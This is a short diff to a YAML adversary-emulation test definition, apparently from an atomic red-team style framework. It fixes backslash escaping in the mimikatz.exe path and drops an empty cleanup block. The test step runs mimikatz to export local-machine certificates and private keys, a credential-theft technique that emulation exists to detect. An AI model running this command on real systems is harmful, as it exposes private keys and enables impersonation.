@@ -6,7 +6,7 @@ description: |
 args:
     - name: mimikatz_exe
       type: string
-      default: PathToAtomicsFolder\..\ExternalPayloads\x64\mimikatz.exe
+      default: PathToAtomicsFolder\\..\\ExternalPayloads\\x64\\mimikatz.exe
 uuid: 290df60e-4b5d-4a5e-b0c7-dc5348ea0c86
 mitre:
     tactics:
@@ -28,6 +28,3 @@ steps:
       inline: |
         "{{.Args.mimikatz_exe}}" "crypto::certificates /systemstore:local_machine /store:my /export"  exit
       executor: command_prompt
-      cleanup:
-        inline: ""
-        executor: command_prompt
